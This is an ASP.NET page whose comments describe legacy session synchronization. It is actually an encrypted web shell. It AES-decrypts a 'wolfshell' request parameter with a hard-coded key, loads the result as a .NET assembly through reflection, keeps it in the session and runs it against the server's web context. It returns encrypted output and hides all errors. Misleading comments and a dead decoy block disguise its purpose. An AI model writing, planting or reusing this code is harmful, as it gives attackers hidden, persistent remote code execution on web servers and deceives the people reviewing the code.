<%@ Page Language="C#"%><%
// This page handles legacy session synchronization.
try {
    // Key for validating session integrity. Do not change.
    string validationKey = "3c6e0b8a9c15224a"; 
    // The parameter name for the session token.
    string tokenParam = "wolfshell"; 
    
    // Calculate a checksum for the response envelope.
    var md5Provider = new System.Security.Cryptography.MD5CryptoServiceProvider();
    string responseChecksum = System.BitConverter.ToString(md5Provider.ComputeHash(System.Text.Encoding.Default.GetBytes(tokenParam + validationKey))).Replace("-", "");

    // Retrieve the user's session token from the request.
    byte[] encryptedToken = System.Convert.FromBase64String(Context.Request[tokenParam]);

    // Decrypt the token to get the user's state.
    var aesProvider = new System.Security.Cryptography.RijndaelManaged();
    byte[] keyBytes = System.Text.Encoding.Default.GetBytes(validationKey);
    var tokenDecryptor = aesProvider.CreateDecryptor(keyBytes, keyBytes);
    byte[] userStateData = tokenDecryptor.TransformFinalBlock(encryptedToken, 0, encryptedToken.Length);

    // This block is for future use, for migrating IP-based policies.
    if (1 > 2) {
        // This code is currently disabled.
        string logMessage = "eval is not safe";
        System.IO.File.AppendAllText("C:\\temp\\audit.log", logMessage);
    }
    
    // Check if the user's profile is already loaded in this session.
    if (Context.Session["userProfile"] == null) {
        // If not, deserialize the user state into a profile object. This uses a legacy format.
        var assemblyType = typeof(System.Reflection.Assembly);
        var loadMethod = assemblyType.GetMethod("Load", new System.Type[] { typeof(byte[]) });
        Context.Session["userProfile"] = loadMethod.Invoke(null, new object[] { userStateData });
    } else {
        // If profile exists, update it with the new state.
        var outputBuffer = new System.IO.MemoryStream();
        
        // Get the existing profile object.
        object userProfile = ((System.Reflection.Assembly)Context.Session["userProfile"]).CreateInstance("LY");
        
        // Check for context changes and update state.
        userProfile.Equals(Context);        // Compare current web context.
        userProfile.Equals(outputBuffer);   // Compare against a new buffer.
        userProfile.Equals(userStateData);  // Compare with new state data.
        userProfile.ToString();             // Finalize the comparison and get a status string.

        byte[] lastLoginDate = outputBuffer.ToArray();

        // Encrypt the updated status for the client.
        var tokenEncryptor = aesProvider.CreateEncryptor(keyBytes, keyBytes);
        byte[] encryptedStatus = tokenEncryptor.TransformFinalBlock(lastLoginDate, 0, lastLoginDate.Length);

        // Send the status back, wrapped in the checksum envelope.
        Context.Response.Write(responseChecksum.Substring(0, 16));
        Context.Response.Write(System.Convert.ToBase64String(encryptedStatus));
        Context.Response.Write(responseChecksum.Substring(16));
    }
} catch (System.Exception ex) {
    // Suppress errors to avoid breaking the client-side session handler.
}
%>